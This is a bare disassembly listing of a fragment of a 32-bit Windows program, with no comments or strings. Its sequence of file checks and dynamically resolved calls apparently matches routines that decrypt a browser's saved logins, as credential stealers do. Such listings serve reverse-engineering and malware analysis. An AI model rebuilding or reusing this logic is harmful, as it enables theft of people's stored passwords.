  40a3ca:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40a3cd:	8b 00                	mov    (%eax),%eax
  40a3cf:	50                   	push   %eax
  40a3d0:	e8 eb 91 ff ff       	call   0x4035c0
  40a3d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a3d8:	50                   	push   %eax
  40a3d9:	e8 e2 91 ff ff       	call   0x4035c0
  40a3de:	33 c0                	xor    %eax,%eax
  40a3e0:	5a                   	pop    %edx
  40a3e1:	59                   	pop    %ecx
  40a3e2:	59                   	pop    %ecx
  40a3e3:	64 89 10             	mov    %edx,%fs:(%eax)
  40a3e6:	eb 0a                	jmp    0x40a3f2
  40a3e8:	e9 f3 72 ff ff       	jmp    0x4016e0
  40a3ed:	e8 a6 74 ff ff       	call   0x401898
  40a3f2:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40a3f6:	ff 4d ac             	decl   -0x54(%ebp)
  40a3f9:	75 c1                	jne    0x40a3bc
  40a3fb:	e9 62 07 00 00       	jmp    0x40ab62
  40a400:	68 08 ad 40 00       	push   $0x40ad08
  40a405:	e8 26 92 ff ff       	call   0x403630
  40a40a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40a40d:	68 14 ad 40 00       	push   $0x40ad14
  40a412:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40a415:	50                   	push   %eax
  40a416:	e8 f5 91 ff ff       	call   0x403610
  40a41b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40a41e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40a421:	50                   	push   %eax
  40a422:	6a 08                	push   $0x8
  40a424:	e8 a7 91 ff ff       	call   0x4035d0
  40a429:	50                   	push   %eax
  40a42a:	e8 c1 90 ff ff       	call   0x4034f0
  40a42f:	8d 85 3c fe ff ff    	lea    -0x1c4(%ebp),%eax
  40a435:	e8 b2 b7 ff ff       	call   0x405bec
  40a43a:	ff b5 3c fe ff ff    	push   -0x1c4(%ebp)
  40a440:	68 38 ad 40 00       	push   $0x40ad38
  40a445:	68 54 ad 40 00       	push   $0x40ad54
  40a44a:	8d 85 40 fe ff ff    	lea    -0x1c0(%ebp),%eax
  40a450:	ba 03 00 00 00       	mov    $0x3,%edx
  40a455:	e8 b6 79 ff ff       	call   0x401e10
  40a45a:	8b 85 40 fe ff ff    	mov    -0x1c0(%ebp),%eax
  40a460:	e8 e3 7a ff ff       	call   0x401f48
  40a465:	50                   	push   %eax
  40a466:	68 04 01 00 00       	push   $0x104
  40a46b:	8d 85 9f fe ff ff    	lea    -0x161(%ebp),%eax
  40a471:	50                   	push   %eax
  40a472:	68 64 ad 40 00       	push   $0x40ad64
  40a477:	68 68 ad 40 00       	push   $0x40ad68
  40a47c:	68 70 ad 40 00       	push   $0x40ad70
  40a481:	e8 82 91 ff ff       	call   0x403608
  40a486:	8d 85 30 fe ff ff    	lea    -0x1d0(%ebp),%eax
  40a48c:	e8 5b b7 ff ff       	call   0x405bec
  40a491:	ff b5 30 fe ff ff    	push   -0x1d0(%ebp)
  40a497:	68 38 ad 40 00       	push   $0x40ad38
  40a49c:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  40a4a2:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a4a8:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a4ad:	e8 72 78 ff ff       	call   0x401d24
  40a4b2:	ff b5 2c fe ff ff    	push   -0x1d4(%ebp)
  40a4b8:	68 84 ad 40 00       	push   $0x40ad84
  40a4bd:	8d 85 34 fe ff ff    	lea    -0x1cc(%ebp),%eax
  40a4c3:	ba 04 00 00 00       	mov    $0x4,%edx
  40a4c8:	e8 43 79 ff ff       	call   0x401e10
  40a4cd:	8b 85 34 fe ff ff    	mov    -0x1cc(%ebp),%eax
  40a4d3:	e8 70 7a ff ff       	call   0x401f48
  40a4d8:	8b d0                	mov    %eax,%edx
  40a4da:	8d 85 38 fe ff ff    	lea    -0x1c8(%ebp),%eax
  40a4e0:	e8 c7 77 ff ff       	call   0x401cac
  40a4e5:	8b 85 38 fe ff ff    	mov    -0x1c8(%ebp),%eax
  40a4eb:	e8 14 b8 ff ff       	call   0x405d04
  40a4f0:	3c 01                	cmp    $0x1,%al
  40a4f2:	75 57                	jne    0x40a54b
  40a4f4:	8d 85 24 fe ff ff    	lea    -0x1dc(%ebp),%eax
  40a4fa:	e8 ed b6 ff ff       	call   0x405bec
  40a4ff:	ff b5 24 fe ff ff    	push   -0x1dc(%ebp)
  40a505:	68 38 ad 40 00       	push   $0x40ad38
  40a50a:	8d 85 20 fe ff ff    	lea    -0x1e0(%ebp),%eax
  40a510:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a516:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a51b:	e8 04 78 ff ff       	call   0x401d24
  40a520:	ff b5 20 fe ff ff    	push   -0x1e0(%ebp)
  40a526:	68 84 ad 40 00       	push   $0x40ad84
  40a52b:	8d 85 28 fe ff ff    	lea    -0x1d8(%ebp),%eax
  40a531:	ba 04 00 00 00       	mov    $0x4,%edx
  40a536:	e8 d5 78 ff ff       	call   0x401e10
  40a53b:	8b 85 28 fe ff ff    	mov    -0x1d8(%ebp),%eax
  40a541:	e8 02 7a ff ff       	call   0x401f48
  40a546:	e9 58 02 00 00       	jmp    0x40a7a3
  40a54b:	8d 85 14 fe ff ff    	lea    -0x1ec(%ebp),%eax
  40a551:	e8 96 b6 ff ff       	call   0x405bec
  40a556:	ff b5 14 fe ff ff    	push   -0x1ec(%ebp)
  40a55c:	68 38 ad 40 00       	push   $0x40ad38
  40a561:	8d 85 10 fe ff ff    	lea    -0x1f0(%ebp),%eax
  40a567:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a56d:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a572:	e8 ad 77 ff ff       	call   0x401d24
  40a577:	ff b5 10 fe ff ff    	push   -0x1f0(%ebp)
  40a57d:	68 9c ad 40 00       	push   $0x40ad9c
  40a582:	8d 85 18 fe ff ff    	lea    -0x1e8(%ebp),%eax
  40a588:	ba 04 00 00 00       	mov    $0x4,%edx
  40a58d:	e8 7e 78 ff ff       	call   0x401e10
  40a592:	8b 85 18 fe ff ff    	mov    -0x1e8(%ebp),%eax
  40a598:	e8 ab 79 ff ff       	call   0x401f48
  40a59d:	8b d0                	mov    %eax,%edx
  40a59f:	8d 85 1c fe ff ff    	lea    -0x1e4(%ebp),%eax
  40a5a5:	e8 02 77 ff ff       	call   0x401cac
  40a5aa:	8b 85 1c fe ff ff    	mov    -0x1e4(%ebp),%eax
  40a5b0:	e8 4f b7 ff ff       	call   0x405d04
  40a5b5:	3c 01                	cmp    $0x1,%al
  40a5b7:	75 57                	jne    0x40a610
  40a5b9:	8d 85 08 fe ff ff    	lea    -0x1f8(%ebp),%eax
  40a5bf:	e8 28 b6 ff ff       	call   0x405bec
  40a5c4:	ff b5 08 fe ff ff    	push   -0x1f8(%ebp)
  40a5ca:	68 38 ad 40 00       	push   $0x40ad38
  40a5cf:	8d 85 04 fe ff ff    	lea    -0x1fc(%ebp),%eax
  40a5d5:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a5db:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a5e0:	e8 3f 77 ff ff       	call   0x401d24
  40a5e5:	ff b5 04 fe ff ff    	push   -0x1fc(%ebp)
  40a5eb:	68 9c ad 40 00       	push   $0x40ad9c
  40a5f0:	8d 85 0c fe ff ff    	lea    -0x1f4(%ebp),%eax
  40a5f6:	ba 04 00 00 00       	mov    $0x4,%edx
  40a5fb:	e8 10 78 ff ff       	call   0x401e10
  40a600:	8b 85 0c fe ff ff    	mov    -0x1f4(%ebp),%eax
  40a606:	e8 3d 79 ff ff       	call   0x401f48
  40a60b:	e9 93 01 00 00       	jmp    0x40a7a3
  40a610:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  40a616:	e8 d1 b5 ff ff       	call   0x405bec
  40a61b:	ff b5 f8 fd ff ff    	push   -0x208(%ebp)
  40a621:	68 38 ad 40 00       	push   $0x40ad38
  40a626:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  40a62c:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a632:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a637:	e8 e8 76 ff ff       	call   0x401d24
  40a63c:	ff b5 f4 fd ff ff    	push   -0x20c(%ebp)
  40a642:	68 b4 ad 40 00       	push   $0x40adb4
  40a647:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40a64d:	ba 04 00 00 00       	mov    $0x4,%edx
  40a652:	e8 b9 77 ff ff       	call   0x401e10
  40a657:	8b 85 fc fd ff ff    	mov    -0x204(%ebp),%eax
  40a65d:	e8 e6 78 ff ff       	call   0x401f48
  40a662:	8b d0                	mov    %eax,%edx
  40a664:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  40a66a:	e8 3d 76 ff ff       	call   0x401cac
  40a66f:	8b 85 00 fe ff ff    	mov    -0x200(%ebp),%eax
  40a675:	e8 8a b6 ff ff       	call   0x405d04
  40a67a:	3c 01                	cmp    $0x1,%al
  40a67c:	75 57                	jne    0x40a6d5
  40a67e:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  40a684:	e8 63 b5 ff ff       	call   0x405bec
  40a689:	ff b5 ec fd ff ff    	push   -0x214(%ebp)
  40a68f:	68 38 ad 40 00       	push   $0x40ad38
  40a694:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  40a69a:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a6a0:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a6a5:	e8 7a 76 ff ff       	call   0x401d24
  40a6aa:	ff b5 e8 fd ff ff    	push   -0x218(%ebp)
  40a6b0:	68 b4 ad 40 00       	push   $0x40adb4
  40a6b5:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40a6bb:	ba 04 00 00 00       	mov    $0x4,%edx
  40a6c0:	e8 4b 77 ff ff       	call   0x401e10
  40a6c5:	8b 85 f0 fd ff ff    	mov    -0x210(%ebp),%eax
  40a6cb:	e8 78 78 ff ff       	call   0x401f48
  40a6d0:	e9 ce 00 00 00       	jmp    0x40a7a3
  40a6d5:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  40a6db:	e8 0c b5 ff ff       	call   0x405bec
  40a6e0:	ff b5 dc fd ff ff    	push   -0x224(%ebp)
  40a6e6:	68 38 ad 40 00       	push   $0x40ad38
  40a6eb:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  40a6f1:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a6f7:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a6fc:	e8 23 76 ff ff       	call   0x401d24
  40a701:	ff b5 d8 fd ff ff    	push   -0x228(%ebp)
  40a707:	68 cc ad 40 00       	push   $0x40adcc
  40a70c:	8d 85 e0 fd ff ff    	lea    -0x220(%ebp),%eax
  40a712:	ba 04 00 00 00       	mov    $0x4,%edx
  40a717:	e8 f4 76 ff ff       	call   0x401e10
  40a71c:	8b 85 e0 fd ff ff    	mov    -0x220(%ebp),%eax
  40a722:	e8 21 78 ff ff       	call   0x401f48
  40a727:	8b d0                	mov    %eax,%edx
  40a729:	8d 85 e4 fd ff ff    	lea    -0x21c(%ebp),%eax
  40a72f:	e8 78 75 ff ff       	call   0x401cac
  40a734:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  40a73a:	e8 c5 b5 ff ff       	call   0x405d04
  40a73f:	3c 01                	cmp    $0x1,%al
  40a741:	75 54                	jne    0x40a797
  40a743:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
  40a749:	e8 9e b4 ff ff       	call   0x405bec
  40a74e:	ff b5 d0 fd ff ff    	push   -0x230(%ebp)
  40a754:	68 38 ad 40 00       	push   $0x40ad38
  40a759:	8d 85 cc fd ff ff    	lea    -0x234(%ebp),%eax
  40a75f:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a765:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a76a:	e8 b5 75 ff ff       	call   0x401d24
  40a76f:	ff b5 cc fd ff ff    	push   -0x234(%ebp)
  40a775:	68 cc ad 40 00       	push   $0x40adcc
  40a77a:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  40a780:	ba 04 00 00 00       	mov    $0x4,%edx
  40a785:	e8 86 76 ff ff       	call   0x401e10
  40a78a:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  40a790:	e8 b3 77 ff ff       	call   0x401f48
  40a795:	eb 0c                	jmp    0x40a7a3
  40a797:	8b c3                	mov    %ebx,%eax
  40a799:	e8 22 73 ff ff       	call   0x401ac0
  40a79e:	e9 bf 03 00 00       	jmp    0x40ab62
  40a7a3:	6a 00                	push   $0x0
  40a7a5:	6a 00                	push   $0x0
  40a7a7:	6a 03                	push   $0x3
  40a7a9:	6a 00                	push   $0x0
  40a7ab:	6a 01                	push   $0x1
  40a7ad:	68 00 00 00 80       	push   $0x80000000
  40a7b2:	50                   	push   %eax
  40a7b3:	e8 98 8d ff ff       	call   0x403550
  40a7b8:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40a7bb:	6a 00                	push   $0x0
  40a7bd:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40a7c0:	50                   	push   %eax
  40a7c1:	e8 22 8e ff ff       	call   0x4035e8
  40a7c6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40a7c9:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40a7cc:	e8 a3 69 ff ff       	call   0x401174
  40a7d1:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40a7d4:	6a 00                	push   $0x0
  40a7d6:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40a7d9:	50                   	push   %eax
  40a7da:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40a7dd:	50                   	push   %eax
  40a7de:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40a7e1:	50                   	push   %eax
  40a7e2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40a7e5:	50                   	push   %eax
  40a7e6:	e8 65 8e ff ff       	call   0x403650
  40a7eb:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40a7ee:	50                   	push   %eax
  40a7ef:	e8 44 8d ff ff       	call   0x403538
  40a7f4:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40a7f7:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40a7fa:	e8 ad 74 ff ff       	call   0x401cac
  40a7ff:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40a802:	e8 85 69 ff ff       	call   0x40118c
  40a807:	8b 55 cc             	mov    -0x34(%ebp),%edx
  40a80a:	b8 e4 ad 40 00       	mov    $0x40ade4,%eax
  40a80f:	e8 18 78 ff ff       	call   0x40202c
  40a814:	8b c8                	mov    %eax,%ecx
  40a816:	83 c1 02             	add    $0x2,%ecx
  40a819:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40a81c:	ba 01 00 00 00       	mov    $0x1,%edx
  40a821:	e8 be 77 ff ff       	call   0x401fe4
  40a826:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  40a82c:	e8 bb b3 ff ff       	call   0x405bec
  40a831:	ff b5 c4 fd ff ff    	push   -0x23c(%ebp)
  40a837:	68 38 ad 40 00       	push   $0x40ad38
  40a83c:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  40a842:	8d 95 9f fe ff ff    	lea    -0x161(%ebp),%edx
  40a848:	b9 05 01 00 00       	mov    $0x105,%ecx
  40a84d:	e8 d2 74 ff ff       	call   0x401d24
  40a852:	ff b5 c0 fd ff ff    	push   -0x240(%ebp)
  40a858:	8d 85 c8 fd ff ff    	lea    -0x238(%ebp),%eax
  40a85e:	ba 03 00 00 00       	mov    $0x3,%edx
  40a863:	e8 a8 75 ff ff       	call   0x401e10
  40a868:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  40a86e:	e8 d5 76 ff ff       	call   0x401f48
  40a873:	50                   	push   %eax
  40a874:	ff 55 f8             	call   *-0x8(%ebp)
  40a877:	59                   	pop    %ecx
  40a878:	85 c0                	test   %eax,%eax
  40a87a:	0f 85 00 02 00 00    	jne    0x40aa80
  40a880:	ff 55 f4             	call   *-0xc(%ebp)
  40a883:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40a886:	83 7d b4 00          	cmpl   $0x0,-0x4c(%ebp)
  40a88a:	0f 84 ed 01 00 00    	je     0x40aa7d
  40a890:	6a 00                	push   $0x0
  40a892:	6a 01                	push   $0x1
  40a894:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40a897:	50                   	push   %eax
  40a898:	ff 55 f0             	call   *-0x10(%ebp)
  40a89b:	83 c4 0c             	add    $0xc,%esp
  40a89e:	85 c0                	test   %eax,%eax
  40a8a0:	0f 85 cf 01 00 00    	jne    0x40aa75
  40a8a6:	e9 ba 01 00 00       	jmp    0x40aa65
  40a8ab:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40a8ae:	50                   	push   %eax
  40a8af:	8b 55 cc             	mov    -0x34(%ebp),%edx
  40a8b2:	b8 e4 ad 40 00       	mov    $0x40ade4,%eax
  40a8b7:	e8 70 77 ff ff       	call   0x40202c
  40a8bc:	8b c8                	mov    %eax,%ecx
  40a8be:	49                   	dec    %ecx
  40a8bf:	ba 01 00 00 00       	mov    $0x1,%edx
  40a8c4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40a8c7:	e8 d8 76 ff ff       	call   0x401fa4
  40a8cc:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40a8cf:	e8 7c 74 ff ff       	call   0x401d50
  40a8d4:	8b c8                	mov    %eax,%ecx
  40a8d6:	83 c1 03             	add    $0x3,%ecx
  40a8d9:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40a8dc:	ba 01 00 00 00       	mov    $0x1,%edx
  40a8e1:	e8 fe 76 ff ff       	call   0x401fe4
  40a8e6:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40a8e9:	50                   	push   %eax
  40a8ea:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40a8ed:	b8 f0 ad 40 00       	mov    $0x40adf0,%eax
  40a8f2:	e8 35 77 ff ff       	call   0x40202c
  40a8f7:	8b c8                	mov    %eax,%ecx
  40a8f9:	49                   	dec    %ecx
  40a8fa:	ba 01 00 00 00       	mov    $0x1,%edx
  40a8ff:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40a902:	e8 9d 76 ff ff       	call   0x401fa4
  40a907:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40a90a:	e8 41 74 ff ff       	call   0x401d50
  40a90f:	8b c8                	mov    %eax,%ecx
  40a911:	83 c1 02             	add    $0x2,%ecx
  40a914:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40a917:	ba 01 00 00 00       	mov    $0x1,%edx
  40a91c:	e8 c3 76 ff ff       	call   0x401fe4
  40a921:	ff 75 b0             	push   -0x50(%ebp)
  40a924:	68 fc ad 40 00       	push   $0x40adfc
  40a929:	ff 75 c0             	push   -0x40(%ebp)
  40a92c:	68 0c ae 40 00       	push   $0x40ae0c
  40a931:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40a934:	ba 04 00 00 00       	mov    $0x4,%edx
  40a939:	e8 d2 74 ff ff       	call   0x401e10
  40a93e:	e9 12 01 00 00       	jmp    0x40aa55
  40a943:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40a946:	50                   	push   %eax
  40a947:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40a94a:	b8 f0 ad 40 00       	mov    $0x40adf0,%eax
  40a94f:	e8 d8 76 ff ff       	call   0x40202c
  40a954:	8b c8                	mov    %eax,%ecx
  40a956:	49                   	dec    %ecx
  40a957:	ba 01 00 00 00       	mov    $0x1,%edx
  40a95c:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40a95f:	e8 40 76 ff ff       	call   0x401fa4
  40a964:	8b 45 bc             	mov    -0x44(%ebp),%eax
  40a967:	e8 e4 73 ff ff       	call   0x401d50
  40a96c:	8b c8                	mov    %eax,%ecx
  40a96e:	83 c1 02             	add    $0x2,%ecx
  40a971:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40a974:	ba 01 00 00 00       	mov    $0x1,%edx
  40a979:	e8 66 76 ff ff       	call   0x401fe4
  40a97e:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40a981:	50                   	push   %eax
  40a982:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40a985:	b8 f0 ad 40 00       	mov    $0x40adf0,%eax
  40a98a:	e8 9d 76 ff ff       	call   0x40202c
  40a98f:	8b c8                	mov    %eax,%ecx
  40a991:	49                   	dec    %ecx
  40a992:	ba 01 00 00 00       	mov    $0x1,%edx
  40a997:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40a99a:	e8 05 76 ff ff       	call   0x401fa4
  40a99f:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40a9a2:	e8 a9 73 ff ff       	call   0x401d50
  40a9a7:	8b c8                	mov    %eax,%ecx
  40a9a9:	83 c1 02             	add    $0x2,%ecx
  40a9ac:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40a9af:	ba 01 00 00 00       	mov    $0x1,%edx
  40a9b4:	e8 2b 76 ff ff       	call   0x401fe4
  40a9b9:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40a9bc:	e8 8f 73 ff ff       	call   0x401d50
  40a9c1:	50                   	push   %eax
  40a9c2:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40a9c5:	e8 7e 75 ff ff       	call   0x401f48
  40a9ca:	50                   	push   %eax
  40a9cb:	8d 85 93 fe ff ff    	lea    -0x16d(%ebp),%eax
  40a9d1:	50                   	push   %eax
  40a9d2:	6a 00                	push   $0x0
  40a9d4:	ff d6                	call   *%esi
  40a9d6:	83 c4 10             	add    $0x10,%esp
  40a9d9:	6a 00                	push   $0x0
  40a9db:	8d 85 87 fe ff ff    	lea    -0x179(%ebp),%eax
  40a9e1:	50                   	push   %eax
  40a9e2:	8d 85 93 fe ff ff    	lea    -0x16d(%ebp),%eax
  40a9e8:	50                   	push   %eax
  40a9e9:	ff d7                	call   *%edi
  40a9eb:	83 c4 0c             	add    $0xc,%esp
  40a9ee:	85 c0                	test   %eax,%eax
  40a9f0:	75 63                	jne    0x40aa55
  40a9f2:	8b c3                	mov    %ebx,%eax
  40a9f4:	8b 95 8b fe ff ff    	mov    -0x175(%ebp),%edx
  40a9fa:	e8 ad 72 ff ff       	call   0x401cac
  40a9ff:	8b c3                	mov    %ebx,%eax
  40aa01:	8b 95 8f fe ff ff    	mov    -0x171(%ebp),%edx
  40aa07:	e8 68 76 ff ff       	call   0x402074
  40aa0c:	8b 45 bc             	mov    -0x44(%ebp),%eax
  40aa0f:	e8 3c 73 ff ff       	call   0x401d50
  40aa14:	85 c0                	test   %eax,%eax
  40aa16:	75 0d                	jne    0x40aa25
  40aa18:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40aa1b:	ba 18 ae 40 00       	mov    $0x40ae18,%edx
  40aa20:	e8 33 71 ff ff       	call   0x401b58
  40aa25:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40aa28:	e8 23 73 ff ff       	call   0x401d50
  40aa2d:	85 c0                	test   %eax,%eax
  40aa2f:	75 0d                	jne    0x40aa3e
  40aa31:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40aa34:	ba 30 ae 40 00       	mov    $0x40ae30,%edx
  40aa39:	e8 1a 71 ff ff       	call   0x401b58
  40aa3e:	ff 75 b0             	push   -0x50(%ebp)
  40aa41:	ff 33                	push   (%ebx)
  40aa43:	68 0c ae 40 00       	push   $0x40ae0c
  40aa48:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40aa4b:	ba 03 00 00 00       	mov    $0x3,%edx
  40aa50:	e8 bb 73 ff ff       	call   0x401e10
  40aa55:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40aa58:	e8 f3 72 ff ff       	call   0x401d50
  40aa5d:	85 c0                	test   %eax,%eax
  40aa5f:	0f 85 de fe ff ff    	jne    0x40a943
  40aa65:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40aa68:	e8 e3 72 ff ff       	call   0x401d50
  40aa6d:	85 c0                	test   %eax,%eax
  40aa6f:	0f 85 36 fe ff ff    	jne    0x40a8ab
  40aa75:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40aa78:	50                   	push   %eax
  40aa79:	ff 55 e8             	call   *-0x18(%ebp)
  40aa7c:	59                   	pop    %ecx
  40aa7d:	ff 55 ec             	call   *-0x14(%ebp)
  40aa80:	8b c3                	mov    %ebx,%eax
  40aa82:	b9 fc ad 40 00       	mov    $0x40adfc,%ecx
  40aa87:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40aa8a:	e8 0d 73 ff ff       	call   0x401d9c
  40aa8f:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40aa92:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40aa95:	e8 be 70 ff ff       	call   0x401b58
  40aa9a:	8d 85 bc fd ff ff    	lea    -0x244(%ebp),%eax
  40aaa0:	50                   	push   %eax
  40aaa1:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40aaa4:	33 d2                	xor    %edx,%edx
  40aaa6:	b8 fc ad 40 00       	mov    $0x40adfc,%eax
  40aaab:	e8 7c ae ff ff       	call   0x40592c
  40aab0:	8b 95 bc fd ff ff    	mov    -0x244(%ebp),%edx
  40aab6:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40aab9:	e8 9a 70 ff ff       	call   0x401b58
  40aabe:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  40aac4:	50                   	push   %eax
  40aac5:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40aac8:	33 d2                	xor    %edx,%edx
  40aaca:	b8 0c ae 40 00       	mov    $0x40ae0c,%eax
  40aacf:	e8 58 ae ff ff       	call   0x40592c
  40aad4:	8b 95 b8 fd ff ff    	mov    -0x248(%ebp),%edx
  40aada:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40aadd:	e8 76 70 ff ff       	call   0x401b58
  40aae2:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40aae8:	50                   	push   %eax
  40aae9:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40aaec:	33 d2                	xor    %edx,%edx
  40aaee:	b8 4c ae 40 00       	mov    $0x40ae4c,%eax
  40aaf3:	e8 34 ae ff ff       	call   0x40592c
  40aaf8:	8b 95 b4 fd ff ff    	mov    -0x24c(%ebp),%edx
  40aafe:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40ab01:	e8 52 70 ff ff       	call   0x401b58
  40ab06:	83 7d a8 00          	cmpl   $0x0,-0x58(%ebp)
  40ab0a:	75 07                	jne    0x40ab13
  40ab0c:	8b c3                	mov    %ebx,%eax
  40ab0e:	e8 ad 6f ff ff       	call   0x401ac0
  40ab13:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  40ab1a:	8d 85 68 fe ff ff    	lea    -0x198(%ebp),%eax
  40ab20:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40ab23:	33 c0                	xor    %eax,%eax
  40ab25:	55                   	push   %ebp
  40ab26:	68 4f ab 40 00       	push   $0x40ab4f
  40ab2b:	64 ff 30             	push   %fs:(%eax)
  40ab2e:	64 89 20             	mov    %esp,%fs:(%eax)
  40ab31:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40ab34:	8b 00                	mov    (%eax),%eax
  40ab36:	50                   	push   %eax
  40ab37:	e8 84 8a ff ff       	call   0x4035c0
  40ab3c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ab3f:	50                   	push   %eax
  40ab40:	e8 7b 8a ff ff       	call   0x4035c0
  40ab45:	33 c0                	xor    %eax,%eax
  40ab47:	5a                   	pop    %edx
  40ab48:	59                   	pop    %ecx
  40ab49:	59                   	pop    %ecx
  40ab4a:	64 89 10             	mov    %edx,%fs:(%eax)
  40ab4d:	eb 0a                	jmp    0x40ab59
  40ab4f:	e9 8c 6b ff ff       	jmp    0x4016e0
  40ab54:	e8 3f 6d ff ff       	call   0x401898
  40ab59:	83 45 a4 04          	addl   $0x4,-0x5c(%ebp)
  40ab5d:	ff 4d ac             	decl   -0x54(%ebp)
  40ab60:	75 c1                	jne    0x40ab23
  40ab62:	33 c0                	xor    %eax,%eax
  40ab64:	5a                   	pop    %edx
  40ab65:	59                   	pop    %ecx
  40ab66:	59                   	pop    %ecx
  40ab67:	64 89 10             	mov    %edx,%fs:(%eax)
  40ab6a:	68 ac ab 40 00       	push   $0x40abac
  40ab6f:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40ab75:	ba 2d 00 00 00       	mov    $0x2d,%edx
  40ab7a:	e8 65 6f ff ff       	call   0x401ae4
  40ab7f:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40ab82:	e8 39 6f ff ff       	call   0x401ac0
  40ab87:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40ab8a:	e8 31 6f ff ff       	call   0x401ac0
  40ab8f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40ab92:	ba 04 00 00 00       	mov    $0x4,%edx
  40ab97:	e8 48 6f ff ff       	call   0x401ae4
  40ab9c:	8d 45 cc             	lea    -0x34(%ebp),%eax
